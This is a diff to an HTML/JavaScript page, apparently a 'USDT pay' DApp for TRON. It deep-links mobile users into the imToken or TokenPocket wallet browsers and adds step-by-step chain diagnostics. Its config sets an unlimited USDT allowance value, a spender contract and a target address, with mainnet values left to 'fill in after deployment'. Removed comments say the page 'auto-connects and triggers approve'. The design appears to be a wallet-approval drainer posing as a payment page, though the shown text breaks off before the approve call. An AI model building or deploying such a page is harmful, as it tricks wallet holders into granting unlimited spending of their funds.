@@ -38,6 +38,9 @@ html,body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;bac
 .info-val.err{color:var(--err)}
 .info-val.copy{cursor:pointer}
 .info-val.copy:hover{opacity:0.7}
+.info-val .diag-tag{display:inline-flex;align-items:center;gap:3px;margin-left:6px;font-size:10px;padding:1px 6px;border-radius:8px;font-weight:700}
+.info-val .diag-tag.ok{background:#1a3a1a;color:var(--ok)}
+.info-val .diag-tag.fail{background:#3a1a1a;color:var(--err)}
 .step{display:flex;align-items:flex-start;gap:12px;padding:13px 14px;margin-bottom:8px;background:var(--surface);border:1px solid var(--border);border-radius:12px;font-size:13px;transition:all 0.3s}
 .sn{width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;flex-shrink:0;background:var(--border2);border:1px solid var(--border2);color:var(--mute);transition:all 0.3s}
 .sb{flex:1;min-width:0}
@@ -72,7 +75,7 @@ html,body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;bac
 .wb.tl .wi{background:linear-gradient(135deg,#f59e0b,#d97706)}
 .wn{font-size:14px;font-weight:600;color:var(--txt)}
 .ws{font-size:10px;color:var(--mute);margin-top:2px}
-.wbtn-label{font-size:11px;color:var(--mute);margin-bottom:8px;text-align:center;text-align:center}
+.wbtn-label{font-size:11px;color:var(--mute);margin-bottom:8px;text-align:center}
 .abtn{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;padding:14px;background:linear-gradient(135deg,var(--accent),var(--accent2));color:#fff;border:none;border-radius:12px;font-size:14px;font-weight:700;cursor:pointer;transition:all 0.2s;margin-bottom:8px}
 .abtn:hover:not(:disabled){filter:brightness(1.12);transform:translateY(-1px)}
 .abtn:active:not(:disabled){transform:scale(0.99)}
@@ -109,7 +112,7 @@ html,body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;bac
 .dbg-toggle{font-size:14px;color:var(--mute);transition:transform 0.2s}
 .dbg-toggle.open{transform:rotate(90deg)}
 .dbg-body{max-height:0;overflow:hidden;transition:max-height 0.3s ease;font-size:11px;font-family:'Courier New',monospace;color:var(--mute2);line-height:1.8}
-.dbg-body.open{max-height:600px}
+.dbg-body.open{max-height:900px;overflow-y:auto}
 .dbg-line{display:flex;gap:8px;padding:2px 14px;border-bottom:1px solid #0f0f1e}
 .dbg-line:last-child{border-bottom:none}
 .dbg-ts{color:var(--mute);flex-shrink:0}
@@ -123,6 +126,7 @@ html,body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;bac
 .dbg-tag.env{color:#f472b6}
 .dbg-tag.route{color:#fbbf24}
 .dbg-tag.click{color:#38bdf8}
+.dbg-tag.step{color:#60a5fa}
 .dbg-msg{flex:1;word-break:break-all}
 .dv{height:1px;background:var(--border);margin:16px 0}
 .hd{display:none!important}
@@ -135,6 +139,11 @@ html,body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;bac
 .fb-btn:hover{background:#252540}
 .fb-btn:active{transform:scale(0.98)}
 .fb-divider{height:1px;background:var(--border);margin:12px 0}
+.diag-bar{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:12px}
+.diag-item{display:inline-flex;align-items:center;gap:4px;padding:4px 10px;border-radius:8px;font-size:10px;font-weight:700;border:1px solid var(--border);color:var(--mute);background:var(--surface)}
+.diag-item.ok{border-color:#1a3a1a;color:var(--ok)}
+.diag-item.fail{border-color:#3a1a1a;color:var(--err)}
+.diag-item.run{border-color:#1a1a40;color:var(--accent)}
 </style>
 </head>
 <body>
@@ -151,6 +160,9 @@ html,body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;bac
     </div>
   </div>
 
+  <!-- Diagnosis bar (shown during chain data step) -->
+  <div class="diag-bar" id="diagBar" style="display:none"></div>
+
   <!-- Steps -->
   <div class="step" id="s1"><div class="sn" id="s1n">1</div><div class="sb"><div class="st" id="s1t">Connect Wallet</div><div class="sm" id="s1m">Select imToken or TokenPocket</div></div></div>
   <div class="step" id="s2"><div class="sn" id="s2n">2</div><div class="sb"><div class="st" id="s2t">Chain Data</div><div class="sm" id="s2m">Query on-chain data after wallet connects</div></div></div>
@@ -161,18 +173,14 @@ html,body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;bac
 
   <!-- Wallet area -->
   <div id="walletArea">
-    <!-- Loading / instruction box -->
     <div class="info-box hd" id="dlLoading">
       <span class="ic">i</span>
       <span id="dlLoadingText">Opening wallet...</span>
     </div>
-
-    <!-- Fallback box -->
     <div class="fb hd" id="fallbackBox">
       <div class="fb-title" id="fbTitle">Cannot open wallet</div>
       <div class="fb-body" id="fbBody"></div>
     </div>
-
     <div class="wbtn-label" id="wbtnLabel">Tap a wallet to connect</div>
     <div class="wg" id="walletGrid">
       <button class="wb im" id="btnIm">
@@ -197,8 +205,6 @@ html,body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;bac
         <span class="ws">TRON DApp</span>
       </button>
     </div>
-
-    <!-- Guide box: shown when in system browser -->
     <div class="info-box" id="sysGuide">
       <span class="ic">i</span>
       <span id="sysGuideText">System browser detected. Tap a wallet to open this page in the wallet's built-in browser.</span>
@@ -290,21 +296,44 @@ html,body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;bac
 ============================================================ -->
 <script>
 'use strict';
+
+// ================================================================
+// CONFIG — SEPARATED BY NETWORK
+// Nile Testnet USDT: TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf (official)
+// Mainnet  USDT:     TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t (official)
+// ================================================================
 const CONFIG = {
-  NETWORK: 'nile',
-  USDT_CONTRACT: 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf',
-  SPENDER_CONTRACT: 'TYkhsAYUkwav55kZyQ69X8amCGVr8g2C21',
-  TARGET_ADDRESS: 'TQhDv14zqnPkZ1pjB4fDTax3P9sTZpYuhK',
+  NETWORK:          'nile',     // 'nile' or 'mainnet'
+
+  // --- Nile Testnet ---
+  NILE_USDT_CONTRACT:    'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf',  // Official Nile USDT
+  NILE_SPENDER_CONTRACT: 'TYkhsAYUkwav55kZyQ69X8amCGVr8g2C21',
+  NILE_TARGET_ADDRESS:   'TQhDv14zqnPkZ1pjB4fDTax3P9sTZpYuhK',
+
+  // --- Mainnet ---
+  MAINNET_USDT_CONTRACT:    'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
+  MAINNET_SPENDER_CONTRACT: '',   // fill in after deployment
+  MAINNET_TARGET_ADDRESS:   '',   // fill in after deployment
+
   EXPLORER_NILE:    'https://nilescan.io',
   EXPLORER_MAINNET: 'https://tronscan.org',
 };
+
+// Computed getters
+const USDT_CONTRACT    = () => CONFIG.NETWORK === 'nile' ? CONFIG.NILE_USDT_CONTRACT    : CONFIG.MAINNET_USDT_CONTRACT;
+const SPENDER_CONTRACT = () => CONFIG.NETWORK === 'nile' ? CONFIG.NILE_SPENDER_CONTRACT : CONFIG.MAINNET_SPENDER_CONTRACT;
+const TARGET_ADDRESS  = () => CONFIG.NETWORK === 'nile' ? CONFIG.NILE_TARGET_ADDRESS   : CONFIG.MAINNET_TARGET_ADDRESS;
+
 const UNLIMITED_HEX = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
 const DECIMALS      = 6;
 const POLL_MS       = 3000;
 const MAX_BLOCKS    = 19;
 const MAX_POLL      = 40;
-// How long to wait before assuming the wallet opened (iOS Safari deeplink)
 const DEEPLINK_TIMEOUT_MS = 1500;
+
+// Provider wait config
+const PROVIDER_WAIT_MS  = 10000;  // max wait time for provider
+const PROVIDER_POLL_MS  = 300;    // poll interval
 
 const STATE = {
   IDLE:'idle', CONNECTING:'connecting', READY:'ready',
@@ -319,7 +348,23 @@ let lastTx    = null;
 let modalCb   = null;
 let cacheBal  = null;
 let cacheAllow= null;
-let debugMode = false;
+
+// Diagnosis state (Step A–E results)
+const DIAG = {
+  providerSource:  null,   // 'tronLink' | 'tronWeb-direct' | 'tp-tron' | 'none'
+  providerReady:   false,
+  networkHost:     null,   // actual node host
+  networkIsNile:   null,   // boolean
+  configUsdtAddr:  null,   // current USDT_CONTRACT()
+  configAddrValid: null,
+  addrMismatch:    null,   // if Nile but USDT addr ≠ NILE_USDT_CONTRACT
+  contractReady:    null,   // 'ok' | 'fail' | 'pending'
+  contractError:    null,
+  balanceReady:     null,   // 'ok' | 'fail' | 'pending'
+  balanceError:     null,
+  allowanceReady:   null,   // 'ok' | 'fail' | 'pending'
+  allowanceError:   null,
+};
 
 const $ = id => document.getElementById(id);
 const isAddr = addr => addr && addr.length === 34 && addr[0] === 'T';
@@ -357,13 +402,17 @@ const Log = {
   env(msg)     { this.add('ENV', msg); },
   route(msg)   { this.add('ROUTE', msg); },
   click(msg)   { this.add('CLICK', msg); },
+  step(msg)    { this.add('STEP', msg); },
+  diag(msg)    { this.add('DIAG', msg); },
+  raw(msg)     { this.add('RAW', msg); },
   render() {
     const el = $('dbgLog');
     if (!el) return;
-    el.innerHTML = this.lines.slice(-100).map(l => {
+    el.innerHTML = this.lines.slice(-200).map(l => {
       const tagColor = {
         INFO:'info', OK:'ok', ERR:'err', WARN:'warn',
-        DEEPLINK:'deep', TX:'tx', ENV:'env', ROUTE:'route', CLICK:'click'
+        DEEPLINK:'deep', TX:'tx', ENV:'env', ROUTE:'route', CLICK:'click',
+        STEP:'step', DIAG:'step', RAW:'err'
       }[l.tag] || 'info';
       return `<div class="dbg-line"><span class="dbg-ts">${l.ts}</span><span class="dbg-tag ${tagColor}">${l.tag}</span><span class="dbg-msg">${escHtml(l.msg)}</span></div>`;
     }).join('');
@@ -377,36 +426,12 @@ const Log = {
 ============================================================ -->
 <script>
 'use strict';
-/**
- * detectWalletEnvironment()
- *
- * Multi-signal detection for wallet environment.
- *
- * IMPORTANT CONCEPT:
- * - "In-app browser" (内置浏览器): Page is inside wallet's webview.
- *   → window.tronWeb / window.tronLink is PRESENT and READY.
- *   → No deeplink needed. Direct tronWeb calls work.
- *
- * - "System browser" (系统浏览器): Page is in Safari/Chrome.
- *   → No injected provider.
- *   → MUST use deeplink to open wallet, which then loads the DApp
- *     INSIDE the wallet's built-in browser (giving us tronWeb access).
- *
- * Detection signals:
- *   1. Direct object presence: window.tronLink, window.tronWeb, window.tp,
- *      window.imToken, window.ethereum.isImToken
- *   2. UA string patterns (as tie-breakers only)
- *   3. Platform (mobile vs desktop)
- */
 function detectWalletEnvironment() {
   const ua     = navigator.userAgent;
   const uaLow  = ua.toLowerCase();
-
-  // ---- Platform ----
   const isMobile  = /Android|iPhone|iPad|iPod/i.test(ua);
   const isDesktop = !isMobile;
 
-  // ---- Direct object signals (MOST RELIABLE) ----
   const hasTronLink = !!(window.tronLink && window.tronLink.tronWeb && window.tronLink.ready);
   const hasTronWeb  = !!(window.tronWeb && window.tronWeb.ready);
   const hasTPSDK    = !!(window.tp);
@@ -414,14 +439,10 @@ function detectWalletEnvironment() {
   const hasEthereum = !!(window.ethereum);
   const ethIsImToken = hasEthereum && (window.ethereum.isImToken === true);
 
-  // ---- UA patterns (WEAK signal — use as tie-breaker) ----
   const uaTP  = uaLow.includes('tokenpocket') || uaLow.includes('tpwallet');
   const uaIm  = uaLow.includes('imtoken');
   const uaTL  = uaLow.includes('tronlink');
 
-  // ---- Determine context ----
-  // If tronLink or tronWeb is ready, we ARE in an in-app browser (wallet context)
-  // regardless of what the UA says.
   let walletType     = 'unknown';
   let isInAppBrowser = false;
   let reason         = [];
@@ -447,14 +468,10 @@ function detectWalletEnvironment() {
     reason.push('No injected provider found');
   }
 
-  // If on mobile with NO injected provider → definitely system browser
   const isSystemBrowser = isMobile && !isInAppBrowser && !hasTronLink && !hasTronWeb;
-
-  // ---- Capabilities ----
   const canUseInjectedProvider = hasTronLink || hasTronWeb;
   const canUseDeepLink         = isSystemBrowser && isMobile;
 
-  // ---- Recommended flow ----
   let recommendedFlow, recommendedFlowLabel;
   if (canUseInjectedProvider) {
     recommendedFlow      = 'in-app';
@@ -502,57 +519,16 @@ function maskDeeplink(url) {
 
 <!-- ================================================================
      LAYER 4: WALLET ADAPTERS
-     ================================================================
-     CRITICAL DESIGN DECISION:
-     ================================================================
-     The key insight from official docs:
-     - tpoutside://pull.activity opens TP wallet UI but does NOT auto-sign
-     - tpdapp://open?params={url:..., chain:...} opens the DApp INSIDE TP's
-       built-in browser, giving us window.tronWeb access for approve tx
-     - Similarly for imToken: open DApp in imToken's browser
-     ================================================================
-     FLOW:
-       System browser → click wallet button → deeplink to open DApp in wallet
-       → window.tronWeb becomes available → auto-connect → approve tx
 ============================================================ -->
 <script>
 'use strict';
-/**
- * TokenPocket Adapter
- *
- * System browser deeplink strategy:
- *   1. tpdapp://open?params={url, chain} — opens DApp inside TP's built-in browser
- *      This gives window.tronWeb access. The page auto-connects and triggers approve.
- *   2. Only use tpoutside://pull.activity as fallback (it won't auto-sign though).
- *
- * In-app browser: window.tp.tron or window.tronWeb is available directly.
- */
 const TokenPocketAdapter = {
-
-  /**
-   * Build tpdapp:// URL — opens DApp inside TokenPocket's built-in browser.
-   * This is the PRIMARY correct approach for system browser.
-   *
-   * Format: tpdapp://open?params=<URL-encoded JSON>
-   * JSON fields: url, chain, source (optional)
-   * chain: 'TRON' for TRON network
-   */
   buildTPDAppDeeplink() {
-    const pageUrl = window.location.href.split('?')[0]; // clean URL without query
-    const params = {
-      url: pageUrl,
-      chain: 'TRON',
-      source: 'usdt-pay-v2',
-    };
+    const pageUrl = window.location.href.split('?')[0];
+    const params = { url: pageUrl, chain: 'TRON', source: 'usdt-pay-v2' };
     const encoded = encodeURIComponent(JSON.stringify(params));
     return { url: `tpdapp://open?params=${encoded}`, method: 'tpdapp' };
   },
-
-  /**
-   * Build tpoutside://pull.activity URL — opens TP wallet UI.
-   * NOTE: This only opens the wallet, it does NOT auto-sign.
-   * Use as fallback when tpdapp:// doesn't work.
-   */
   buildTPOutsideDeeplink() {
     const actionId = 'apr_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);
     const param = {
@@ -569,20 +545,12 @@ const TokenPocketAdapter = {
     const encoded = encodeURIComponent(JSON.stringify(param));
     return { url: `tpoutside://pull.activity?param=${encoded}`, method: 'tpoutside' };
   },
-
-  /**
-   * Try tpdapp:// first, then fallback to tpoutside://.
-   * This is the correct flow: open DApp in wallet's browser → approve tx appears.
-   */
   openInSystemBrowser() {
-    const { url: tpdappUrl, method: tpdappMethod } = this.buildTPDAppDeeplink();
-    const { url: tpOutsideUrl, method: tpOutsideMethod } = this.buildTPOutsideDeeplink();
-
+    const { url: tpdappUrl } = this.buildTPDAppDeeplink();
+    const { url: tpOutsideUrl } = this.buildTPOutsideDeeplink();
     Log.deep('TokenPocket: attempting tpdapp:// flow (opens DApp in TP browser)');
     Log.deep('URL: ' + maskDeeplink(tpdappUrl));
-    Log.deep('Fallback URL: ' + maskDeeplink(tpOutsideUrl));
 
-    // Show loading
     $('dlLoading').classList.remove('hd');
     $('fallbackBox').classList.add('hd');
     $('sysGuide').classList.add('hd');
@@ -603,7 +571,6 @@ const TokenPocketAdapter = {
       }
     }, 1000);
 
-    // Clear timer if page hides (wallet opened successfully)
     const onVisChange = () => {
       if (document.visibilityState === 'hidden') {
         sessionStorage.setItem('_wcb', '1');
@@ -613,21 +580,11 @@ const TokenPocketAdapter = {
       }
     };
     document.addEventListener('visibilitychange', onVisChange);
-    document.addEventListener('pagehide', () => {
-      clearInterval(timer);
-      timerCleared = true;
-    }, { once: true });
+    document.addEventListener('pagehide', () => { clearInterval(timer); timerCleared = true; }, { once: true });
 
-    // SYNCHRONOUS: trigger deeplink inside click handler
     window.location.href = tpdappUrl;
-
-    setTimeout(() => {
-      clearInterval(timer);
-      timerCleared = true;
-      document.removeEventListener('visibilitychange', onVisChange);
-    }, DEEPLINK_TIMEOUT_MS + 300);
+    setTimeout(() => { clearInterval(timer); timerCleared = true; document.removeEventListener('visibilitychange', onVisChange); }, DEEPLINK_TIMEOUT_MS + 300);
   },
-
   showFallback(tpdappUrl, tpOutsideUrl) {
     const fb = $('fallbackBox');
     fb.classList.remove('hd');
@@ -652,26 +609,17 @@ const TokenPocketAdapter = {
       </div>
     `;
     $('wbtnLabel').textContent = 'Wallet not opened — see options above';
-
     setTimeout(() => {
       const openBtn = $('fbOpenTPDApp');
-      if (openBtn) openBtn.addEventListener('click', () => {
-        Log.deep('Fallback: retrying tpdapp://');
-        window.location.href = tpdappUrl;
-      });
+      if (openBtn) openBtn.addEventListener('click', () => { Log.deep('Fallback: retrying tpdapp://'); window.location.href = tpdappUrl; });
       const copyBtn = $('fbCopyPage');
       if (copyBtn) copyBtn.addEventListener('click', () => {
         navigator.clipboard.writeText(window.location.href.split('?')[0])
           .then(() => toast('Page URL copied! Open TokenPocket and paste', 'ok')).catch(() => {});
       });
     }, 0);
-
     Log.warn('TokenPocket fallback shown');
   },
-
-  /**
-   * Connect via injected provider (TP in-app browser).
-   */
   connectInAppBrowser() {
     Log.info('TokenPocket in-app: trying injected provider');
     if (window.tp && window.tp.tron) {
@@ -687,35 +635,12 @@ const TokenPocketAdapter = {
   },
 };
 
-/**
- * imToken Adapter
- *
- * System browser deeplink strategy:
- *   imtokenv2://navigate/DappView?url=<encoded URL>
- *   This opens the DApp inside imToken's built-in browser.
- *   → window.tronWeb becomes available → approve tx works.
- *
- * In-app browser: window.tronWeb is available directly.
- */
 const ImTokenAdapter = {
-
-  /**
-   * Build imtokenv2://navigate/DappView URL — opens DApp in imToken's browser.
-   * Format: imtokenv2://navigate/DappView?url=<URL-encoded page URL>
-   *
-   * NOTE: This is the OFFICIAL imToken deeplink format per their docs.
-   * The old imtoken://tron/approve does NOT exist.
-   */
   buildDAppViewDeeplink() {
     const pageUrl = window.location.href.split('?')[0];
     const encodedUrl = encodeURIComponent(pageUrl);
     return { url: `imtokenv2://navigate/DappView?url=${encodedUrl}`, method: 'DappView' };
   },
-
-  /**
-   * Build a fallback deeplink — tpoutside (in case imToken is installed
-   * but DappView doesn't work, try opening TP as fallback).
-   */
   buildFallbackDeeplink() {
     const actionId = 'apr_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);
     const param = {
@@ -731,11 +656,9 @@ const ImTokenAdapter = {
     const encoded = encodeURIComponent(JSON.stringify(param));
     return { url: `tpoutside://pull.activity?param=${encoded}`, method: 'tpoutside' };
   },
-
   openInSystemBrowser() {
-    const { url: dappUrl, method } = this.buildDAppViewDeeplink();
+    const { url: dappUrl } = this.buildDAppViewDeeplink();
     const { url: fallbackUrl } = this.buildFallbackDeeplink();
-
     Log.deep('imToken: attempting imtokenv2://DappView flow');
     Log.deep('URL: ' + maskDeeplink(dappUrl));
 
@@ -768,20 +691,11 @@ const ImTokenAdapter = {
       }
     };
     document.addEventListener('visibilitychange', onVisChange);
-    document.addEventListener('pagehide', () => {
-      clearInterval(timer);
-      timerCleared = true;
-    }, { once: true });
+    document.addEventListener('pagehide', () => { clearInterval(timer); timerCleared = true; }, { once: true });
 
     window.location.href = dappUrl;
-
-    setTimeout(() => {
-      clearInterval(timer);
-      timerCleared = true;
-      document.removeEventListener('visibilitychange', onVisChange);
-    }, DEEPLINK_TIMEOUT_MS + 300);
+    setTimeout(() => { clearInterval(timer); timerCleared = true; document.removeEventListener('visibilitychange', onVisChange); }, DEEPLINK_TIMEOUT_MS + 300);
   },
-
   showFallback(dappUrl, fallbackUrl) {
     const fb = $('fallbackBox');
     fb.classList.remove('hd');
@@ -806,23 +720,17 @@ const ImTokenAdapter = {
       </div>
     `;
     $('wbtnLabel').textContent = 'Wallet not opened — see options above';
-
     setTimeout(() => {
       const openBtn = $('fbOpenImDApp');
-      if (openBtn) openBtn.addEventListener('click', () => {
-        Log.deep('Fallback: retrying imtokenv2://');
-        window.location.href = dappUrl;
-      });
+      if (openBtn) openBtn.addEventListener('click', () => { Log.deep('Fallback: retrying imtokenv2://'); window.location.href = dappUrl; });
       const copyBtn = $('fbCopyPage');
       if (copyBtn) copyBtn.addEventListener('click', () => {
         navigator.clipboard.writeText(window.location.href.split('?')[0])
           .then(() => toast('Page URL copied! Open imToken and paste', 'ok')).catch(() => {});
       });
     }, 0);
-
     Log.warn('imToken fallback shown');
   },
-
   connectInAppBrowser() {
     Log.info('imToken in-app: trying injected provider');
     if (window.imToken && window.imToken.getProvider) {
@@ -839,13 +747,15 @@ const ImTokenAdapter = {
 </script>
 
 <!-- ================================================================
-     LAYER 5: TRONWEB PROVIDER
+     LAYER 5: TRONWEB PROVIDER + CHAIN DIAGNOSIS
 ============================================================ -->
 <script>
 'use strict';
+
 /**
- * Get the ready TronWeb instance from any source.
- * Priority: tronLink > tronWeb-direct > tp.tron
+ * getTronWeb()
+ * Returns { tw, source } from the best available provider.
+ * source: 'tronLink' | 'tronWeb-direct' | 'tp-tron' | 'none'
  */
 function getTronWeb() {
   if (window.tronLink && window.tronLink.tronWeb && window.tronLink.ready) {
@@ -860,18 +770,334 @@ function getTronWeb() {
   return { tw: null, source: 'none' };
 }
 
-async function queryBal(addr) {
+/**
+ * waitForInjectedProvider(timeoutMs, pollMs)
+ * Poll every pollMs ms until a provider is ready, or timeout.
+ * Returns { tw, source } or throws TimeoutError.
+ */
+async function waitForInjectedProvider(timeoutMs, pollMs) {
+  const deadline = Date.now() + timeoutMs;
+  let attempts = 0;
+
+  while (Date.now() < deadline) {
+    attempts++;
+    const { tw, source } = getTronWeb();
+    if (tw) {
+      Log.info(`waitForInjectedProvider: found ${source} after ${attempts} attempt(s)`);
+      return { tw, source };
+    }
+    await delay(pollMs);
+  }
+  throw new Error(`waitForInjectedProvider: timed out after ${attempts} attempts (${timeoutMs}ms)`);
+}
+
+/**
+ * Extract raw error info from any error object.
+ * Used everywhere to avoid "unknown error" problems.
+ */
+function extractError(e) {
+  const type = typeof e;
+  let message = e && e.message ? e.message : (e ? String(e) : 'Unknown error');
+  let code     = e && e.code !== undefined ? e.code : null;
+  let data     = e && e.data !== undefined ? e.data : null;
+  let stack    = e && e.stack ? e.stack : null;
+  let json     = null;
+  try { json = JSON.stringify(e); } catch(_) {}
+
+  // Clean up common vague messages
+  if (!message || message === 'Error' || message === '[object Object]') {
+    message = 'Unknown provider/contract error';
+    if (json) message += ' — raw: ' + json;
+  }
+
+  return { message, code, data, stack, json, type };
+}
+
+function logRawError(label, e) {
+  const err = extractError(e);
+  Log.raw(label + ' | message: ' + err.message);
+  if (err.code !== null) Log.raw(label + ' | code: ' + err.code);
+  if (err.data !== null) Log.raw(label + ' | data: ' + JSON.stringify(err.data));
+  if (err.stack) Log.raw(label + ' | stack: ' + err.stack);
+  if (err.json && err.json !== err.message) Log.raw(label + ' | full JSON: ' + err.json);
+}
+
+function formatDetailedError(label, e) {
+  const err = extractError(e);
+  let msg = label + ': ' + err.message;
+  if (err.code !== null) msg += ' (code=' + err.code + ')';
+  return msg;
+}
+
+/**
+ * diagnoseChainAccess() — Step A through E
+ *
+ * Returns a DIAG_RESULT object:
+ *   { success: boolean, stage: 'A'|'B'|'C'|'D_bal'|'D_allow'|'all', message: string }
+ *
+ * This is the core split-diagnosis function.
+ */
+async function diagnoseChainAccess() {
+  Log.step('========== diagnoseChainAccess() START ==========');
+  showDiagBar();
+
+  // Reset DIAG state
+  Object.assign(DIAG, {
+    providerSource: null, providerReady: false,
+    networkHost: null, networkIsNile: null,
+    configUsdtAddr: null, configAddrValid: null, addrMismatch: null,
+    contractReady: 'pending', contractError: null,
+    balanceReady: 'pending', balanceError: null,
+    allowanceReady: 'pending', allowanceError: null,
+  });
+
+  // ---- STEP A: Provider Diagnosis ----
+  Log.step('--- STEP A: Provider Diagnosis ---');
+  stepSet(2, 'on', 'Chain Data', 'Step A: Detecting provider...', null);
+  updateDiagItem('diagA', 'run', 'A: Provider');
+  renderDiagBar();
+
+  const { tw, source } = getTronWeb();
+  DIAG.providerSource = source;
+  DIAG.providerReady = !!tw;
+
+  // Log all signals
+  Log.diag('window.tronLink: ' + !!window.tronLink);
+  Log.diag('window.tronLink?.ready: ' + !!(window.tronLink && window.tronLink.ready));
+  Log.diag('window.tronWeb: ' + !!window.tronWeb);
+  Log.diag('window.tronWeb?.ready: ' + !!(window.tronWeb && window.tronWeb.ready));
+  Log.diag('window.tp: ' + !!window.tp);
+  Log.diag('window.tp?.tron: ' + !!(window.tp && window.tp.tron));
+  Log.diag('source: ' + source);
+  if (tw) {
+    Log.diag('tw.defaultAddress?.base58: ' + (tw.defaultAddress?.base58 || 'null'));
+    Log.diag('tw.fullNode?.host: ' + (tw.fullNode?.host || 'null'));
+    Log.diag('tw.solidityNode?.host: ' + (tw.solidityNode?.host || 'null'));
+  }
+
+  if (!tw) {
+    // Try waiting for provider
+    Log.step('STEP A: No provider yet, trying waitForInjectedProvider()...');
+    updateDiagItem('diagA', 'run', 'A: Waiting...');
+    renderDiagBar();
+    try {
+      const result = await waitForInjectedProvider(PROVIDER_WAIT_MS, PROVIDER_POLL_MS);
+      tw = result.tw;
+      DIAG.providerSource = result.source;
+      DIAG.providerReady = true;
+      Log.ok('STEP A: Provider found after waiting: ' + result.source);
+      updateDiagItem('diagA', 'ok', 'A: ' + result.source);
+    } catch (waitErr) {
+      logRawError('STEP A waitForProvider', waitErr);
+      updateDiagItem('diagA', 'fail', 'A: No provider');
+      stepSet(2, 'fail', 'Chain Data', 'No wallet/provider detected. Open in wallet browser.', null);
+      Log.err('STEP A FAILED: No provider available after ' + PROVIDER_WAIT_MS + 'ms');
+      return { success: false, stage: 'A', message: 'No wallet/provider detected. Open this page inside imToken or TokenPocket DApp browser.' };
+    }
+  } else {
+    Log.ok('STEP A: Provider found: ' + source);
+    updateDiagItem('diagA', 'ok', 'A: ' + source);
+  }
+  renderDiagBar();
+
+  // ---- STEP B: Network Diagnosis ----
+  Log.step('--- STEP B: Network Diagnosis ---');
+  stepSet(2, 'on', 'Chain Data', 'Step B: Checking network...', null);
+  updateDiagItem('diagB', 'run', 'B: Network');
+  renderDiagBar();
+
+  DIAG.networkHost = tw.fullNode?.host || tw.solidityNode?.host || 'unknown';
+  const hostLower = (DIAG.networkHost || '').toLowerCase();
+  const isNile = hostLower.includes('nile') || hostLower.includes('api.nileex.io') || hostLower.includes('nile.trongrid.io');
+  DIAG.networkIsNile = isNile;
+
+  Log.diag('provider node host: ' + DIAG.networkHost);
+  Log.diag('networkIsNile: ' + isNile + ' (CONFIG.NETWORK=' + CONFIG.NETWORK + ')');
+
+  if (CONFIG.NETWORK === 'nile' && !isNile) {
+    updateDiagItem('diagB', 'fail', 'B: Wrong net!');
+    stepSet(2, 'fail', 'Chain Data', 'Wallet/provider is NOT connected to Nile testnet (node: ' + DIAG.networkHost + '). Please switch wallet to Nile in settings.', null);
+    Log.err('STEP B FAILED: Provider connected to wrong network. host=' + DIAG.networkHost);
+    return { success: false, stage: 'B', message: 'Wallet/provider is not connected to Nile testnet (connected to: ' + DIAG.networkHost + '). Please switch wallet network to Nile in settings.' };
+  }
+
+  Log.ok('STEP B: Network OK. node=' + DIAG.networkHost);
+  updateDiagItem('diagB', 'ok', 'B: ' + (isNile ? 'Nile' : 'Other net'));
+  renderDiagBar();
+
+  // ---- STEP C: Config Diagnosis ----
+  Log.step('--- STEP C: Config Diagnosis ---');
+  stepSet(2, 'on', 'Chain Data', 'Step C: Validating config...', null);
+  updateDiagItem('diagC', 'run', 'C: Config');
+  renderDiagBar();
+
+  const usdtAddr = USDT_CONTRACT();
+  const spenderAddr = SPENDER_CONTRACT();
+  const targetAddr = TARGET_ADDRESS();
+  DIAG.configUsdtAddr = usdtAddr;
+  DIAG.configAddrValid = isAddr(usdtAddr) && isAddr(spenderAddr);
+
+  Log.diag('CONFIG.USDT_CONTRACT: ' + usdtAddr);
+  Log.diag('CONFIG.SPENDER_CONTRACT: ' + spenderAddr);
+  Log.diag('CONFIG.TARGET_ADDRESS: ' + targetAddr);
+  Log.diag('isAddr(usdtAddr): ' + isAddr(usdtAddr));
+
+  if (!isAddr(usdtAddr) || !isAddr(spenderAddr)) {
+    updateDiagItem('diagC', 'fail', 'C: Bad addr');
+    stepSet(2, 'fail', 'Chain Data', 'CONFIG error: contract address invalid', null);
+    Log.err('STEP C FAILED: Invalid contract address. USDT=' + usdtAddr);
+    return { success: false, stage: 'C', message: 'CONFIG error: USDT or SPENDER contract address is invalid.' };
+  }
+
+  // Check for Nile address mismatch
+  if (CONFIG.NETWORK === 'nile') {
+    const correctNileUsdt = CONFIG.NILE_USDT_CONTRACT;
+    if (usdtAddr !== correctNileUsdt) {
+      DIAG.addrMismatch = { actual: usdtAddr, expected: correctNileUsdt };
+      updateDiagItem('diagC', 'fail', 'C: Wrong addr!');
+      stepSet(2, 'fail', 'Chain Data', 'USDT contract address does not match Nile test USDT! Expected: ' + correctNileUsdt, null);
+      Log.err('STEP C FAILED: USDT address mismatch. actual=' + usdtAddr + ', expected=' + correctNileUsdt);
+      return { success: false, stage: 'C', message: 'USDT contract address does not match Nile test USDT. Expected: ' + correctNileUsdt + ', got: ' + usdtAddr };
+    }
+  }
+
+  Log.ok('STEP C: Config valid. USDT=' + usdtAddr);
+  updateDiagItem('diagC', 'ok', 'C: Valid');
+  renderDiagBar();
+
+  // ---- STEP D: Contract Diagnosis (instantiate + balanceOf + allowance) ----
+  Log.step('--- STEP D: Contract Diagnosis ---');
+  stepSet(2, 'on', 'Chain Data', 'Step D: Connecting to USDT contract...', null);
+  updateDiagItem('diagD', 'run', 'D: Contract');
+  renderDiagBar();
+
+  let usdtContract = null;
+  try {
+    Log.info('Instantiating USDT contract at: ' + usdtAddr);
